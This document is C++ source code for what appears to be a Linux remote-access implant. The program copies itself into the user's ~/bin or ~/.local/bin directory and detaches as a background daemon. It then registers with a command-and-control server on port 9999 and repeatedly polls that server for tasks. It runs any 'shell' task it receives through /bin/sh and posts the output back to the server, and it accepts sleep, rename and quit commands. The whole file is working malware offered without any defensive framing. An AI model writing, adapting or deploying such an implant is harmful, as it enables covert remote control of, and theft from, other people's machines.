#include <arpa/inet.h>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <dlfcn.h>
#include <fcntl.h>
#include <filesystem>
#include <iostream>
#include <sstream>
#include <string>
#include <sys/socket.h>
#include <sys/wait.h>
#include <thread>
#include <unistd.h>
#include <vector>

// For linux
// std::string getExecutablePath() {
//     char path[1024];
//     ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
//     if (len != -1) {
//         path[len] = '\0'; // Null-terminate the string
//         return std::string(path);
//     } else {
//         return "";
//     }
// }

// ----------------------------------------------------------------------------
// Function to split cmd into tokens
std::vector<std::string> splits( std::string cmd, char delim = ' ' )
{
    std::vector<std::string> result;

    std::stringstream ss( cmd );
    std::string       token;

    while ( std::getline( ss, token, delim ) )
    {
        result.push_back( token );
    }

    return result;
}

// ----------------------------------------------------------------------------
std::string shell( const char* cmd )
{
    int pipefd[ 2 ];
    if ( pipe( pipefd ) == -1 )
    {
        perror( "pipe" );
        return "";
    }

    pid_t pid = fork();
    if ( pid == -1 )
    {
        perror( "fork" );
        return "";
    }

    if ( pid == 0 )
    {
        // Child process
        close( pipefd[ 0 ] );   // Close the read end of the pipe

        // Redirect stdout and stderr to the write end of the pipe
        dup2( pipefd[ 1 ], STDOUT_FILENO );
        dup2( pipefd[ 1 ], STDERR_FILENO );

        close( pipefd[ 1 ] );   // Close the write end of the pipe

        // Execute the command
        execl( "/bin/sh", "sh", "-c", cmd, ( char* ) NULL );
        // If execl does something bad...
        perror( "execl" );
        _exit( EXIT_FAILURE );
    }
    else
    {
        // Parent process
        close( pipefd[ 1 ] );

        std::ostringstream result;
        char               buffer[ 1024 ];
        ssize_t            bytesRead;
        while ( ( bytesRead = read( pipefd[ 0 ], buffer, sizeof( buffer ) ) ) >
                0 )
        {
            result.write( buffer, bytesRead );
        }

        close( pipefd[ 0 ] );

        // Wait for the child process to finish
        int status;
        waitpid( pid, &status, 0 );

        return result.str();
    }
}

// ----------------------------------------------------------------------------
std::string Post( const std::string& ip, int port, const std::string& path,
                  const std::string& data )
{
    int socketFd = socket( AF_INET, SOCK_STREAM, 0 );
    if ( socketFd < 0 )
    {
        std::cerr << "Socket creation failed!" << std::endl;
        return "";
    }

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = htons( port );

    if ( inet_pton( AF_INET, ip.c_str(), &server_addr.sin_addr ) <= 0 )
    {
        std::cerr << "Invalid IP address!" << std::endl;
        close( socketFd );
        return "";
    }

    if ( connect( socketFd, ( struct sockaddr* ) &server_addr,
                  sizeof( server_addr ) ) < 0 )
    {
        std::cerr << "Connection failed!" << std::endl;
        close( socketFd );
        return "";
    }

    // Construct the POST req
    std::stringstream request;
    request << "POST " << path << " HTTP/1.1\r\n";
    request << "Host: " << ip << ":" << port << "\r\n";
    request << "Content-Type: application/x-www-form-urlencoded\r\n";
    request << "Content-Length: " << data.length() << "\r\n";
    request << "Connection: close\r\n\r\n";   // End of headers
    request << data;                          // POST data

    std::string request_str = request.str();
    if ( send( socketFd, request_str.c_str(), request_str.length(), 0 ) < 0 )
    {
        std::cerr << "Send failed!" << std::endl;
        close( socketFd );
        return "";
    }

    char        buffer[ 4096 ];
    std::string response;
    ssize_t     bytesRead;
    while ( ( bytesRead = read( socketFd, buffer, sizeof( buffer ) - 1 ) ) > 0 )
    {
        buffer[ bytesRead ] = '\0';
        response += buffer;
    }

    close( socketFd );
    // Find the position of the blank line that separates headers from body
    std::string::size_type bodyStart = response.find( "\r\n\r\n" );
    if ( bodyStart != std::string::npos )
    {
        bodyStart += 4;
        return response.substr( bodyStart );
    }

    return "";
}

// ----------------------------------------------------------------------------
std::string Get( const std::string& ip, int port, const std::string& path )
{
    int socketFd = socket( AF_INET, SOCK_STREAM, 0 );
    if ( socketFd < 0 )
    {
        std::cerr << "Socket creation failed!" << std::endl;
        return "";
    }

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = htons( port );

    if ( inet_pton( AF_INET, ip.c_str(), &server_addr.sin_addr ) <= 0 )
    {
        std::cerr << "Invalid IP address!" << std::endl;
        close( socketFd );
        return "";
    }

    if ( connect( socketFd, ( struct sockaddr* ) &server_addr,
                  sizeof( server_addr ) ) < 0 )
    {
        std::cerr << "Connection failed!" << std::endl;
        close( socketFd );
        return "";
    }

    std::stringstream request;
    request << "GET " << path << " HTTP/1.1\r\n";
    request << "Host: " << ip << ":" << port << "\r\n";
    request << "Connection: close\r\n\r\n";   // End of headers

    std::string request_str = request.str();
    std::cout << "Request: \n";
    std::cout << request_str << '\n';

    if ( send( socketFd, request_str.c_str(), request_str.length(), 0 ) < 0 )
    {
        std::cerr << "Send failed!" << std::endl;
        close( socketFd );
        return "";
    }

    // Receive the response
    char        buffer[ 4096 ];
    std::string response;
    ssize_t     bytesRead;
    while ( ( bytesRead = read( socketFd, buffer, sizeof( buffer ) - 1 ) ) > 0 )
    {
        buffer[ bytesRead ] = '\0';
        response += buffer;
    }

    close( socketFd );
    std::string::size_type bodyStart = response.find( "\r\n\r\n" );
    if ( bodyStart != std::string::npos )
    {
        // Skip past the headers
        bodyStart += 4;   // Length of "\r\n\r\n"
        return response.substr( bodyStart );
    }

    return "";
}

// ----------------------------------------------------------------------------
std::string getExecutablePath()
{
    Dl_info dlInfo;
    if ( dladdr( ( void* ) getExecutablePath, &dlInfo ) != 0 &&
         dlInfo.dli_fname != NULL )
    {
        return std::string( dlInfo.dli_fname );
    }
    else
    {
        return "";
    }
}

// ----------------------------------------------------------------------------
void daemonize( const std::string& pathToMoveBinary )
{
    pid_t pid = fork();

    if ( pid < 0 )
    {
        std::cerr << "Fork failed!" << std::endl;
        exit( EXIT_FAILURE );
    }

    if ( pid > 0 )
    {
        // Parent process
        exit( EXIT_SUCCESS );   // Killing the parent we dont need you anymore
    }

    // Child process
    if ( setsid() < 0 )
    {
        std::cerr << "Failed to create a new session!" << std::endl;
        exit( EXIT_FAILURE );
    }

    pid = fork();
    if ( pid < 0 )
    {
        std::cerr << "Fork failed!" << std::endl;
        exit( EXIT_FAILURE );
    }

    if ( pid > 0 )
    {
        // Parent process
        exit( EXIT_SUCCESS );   // The old child process is now the parent and
                                // we also dont need you anymore
    }

    // Change the working directory to root
    // Needed to make sure it is not in a mounted dir which can couse trouble if
    // unmounted
    if ( chdir( "/" ) < 0 )
    {
        std::cerr << "Failed to change directory to root!" << std::endl;
        exit( EXIT_FAILURE );
    }

    // Redirect standard file descriptors
    close( STDIN_FILENO );
    close( STDOUT_FILENO );
    close( STDERR_FILENO );

    open( "/dev/null", O_RDONLY );
    open( "/dev/null", O_RDWR );
    open( "/dev/null", O_RDWR );

    // Execute me baby
    std::string execPath;
    if ( pathToMoveBinary.empty() )
    {
        execPath = getExecutablePath();
        if ( execPath.empty() )
        {
            std::cerr << "Failed to get executable path!" << std::endl;
            exit( EXIT_FAILURE );
        }
    }
    else
    {
        execPath = pathToMoveBinary;
        execPath += "/linux";
    }

    std::cout << execPath << std::endl;
    char* args[] = { const_cast<char*>( execPath.c_str() ),
                     ( char* ) "--background", NULL };

    execv( execPath.c_str(), args );

    std::cerr << "execl failed!" << std::endl;
    exit( EXIT_FAILURE );
}

// ----------------------------------------------------------------------------
std::string expandTilde( const std::string& path )
{
    if ( path[ 0 ] == '~' )
    {
        const char* home = getenv( "HOME" );
        if ( home )
        {
            return std::string( home ) + path.substr( 1 );
        }
    }
    return path;   // No tilde found, return original
}

// ----------------------------------------------------------------------------
int main( int argc, char* argv[] )
{
    bool isBackground = false;
    for ( int i = 0; i < argc; ++i )
    {
        if ( strcmp( argv[ i ], "--background" ) == 0 )
        {
            isBackground = true;
            break;
        }
    }

    if ( isBackground == false )
    {

        std::string binPath      = expandTilde( "~/bin" );
        std::string localBinPath = expandTilde( "~/.local/bin" );
        std::string pathToMoveBinary;

        if ( std::filesystem::exists( binPath ) &&
             std::filesystem::is_directory( binPath ) )
        {
            pathToMoveBinary = binPath;
        }
        else if ( std::filesystem::exists( localBinPath ) &&
                  std::filesystem::is_directory( localBinPath ) )
        {
            pathToMoveBinary = localBinPath;
        }
        else
        {
            pathToMoveBinary = "";
        }

        if ( !pathToMoveBinary.empty() )
        {
            std::string binaryName = argv[ 0 ];
            std::string cmd = "cp " + binaryName + " " + pathToMoveBinary;
            shell( cmd.c_str() );
        }

        if ( isBackground == false )
        {
            std::cout << "Starting demonizing" << std::endl;
            daemonize( pathToMoveBinary );
        }
    }

    std::string  name, ip, sPort;
    std::string  type = "w";
    unsigned int port;

    int n = 3000;

    // This is needed for the payload
    //    std::ifstream ifs(argv[0]);

    //    ifs.seekg(TEMPLATE_EOF);

    //    std::getline(ifs, ip);
    // std::getline(ifs, sPort);

    //    ifs.close();

    // ip   = "";
    ip   = "";
    port = std::stoi( "9999" );

    std::string hname  = "";
    std::string hnamec = "hostname";
    hname              = shell( hnamec.c_str() );

    while ( true )
    {
        name = Post( ip, port, "/reg", "name=" + hname + "&type=" + type );
        if ( !name.empty() )
        {
            break;
        }

        std::this_thread::sleep_for( std::chrono::milliseconds( n ) );
    }

    while ( true )
    {
        std::string task = Get( ip, port, "/tasks/" + name );

        if ( task != "" )
        {
            std::vector<std::string> Task    = splits( task );
            std::string              command = Task[ 0 ];
            std::string              res     = "";

            if ( command == "sleep" )
            {
                int time = std::stoi( Task[ 1 ] );
                n        = time * 1000;
            }
            else if ( command == "quit" )
            {
                exit( 0 );
            }
            else if ( command == "rename" )
            {
                name = Task[ 1 ];
            }
            else if ( command == "shell" )
            {
                std::string scommand;

                for ( int i = 1; i < Task.size(); i++ )
                {
                    scommand += Task[ i ] + " ";
                }

                res = shell( scommand.c_str() );
            }

            Post( ip, port, "/results/" + name, "result=" + res );
        }

        std::this_thread::sleep_for( std::chrono::milliseconds( n ) );
    }

    return 0;
}
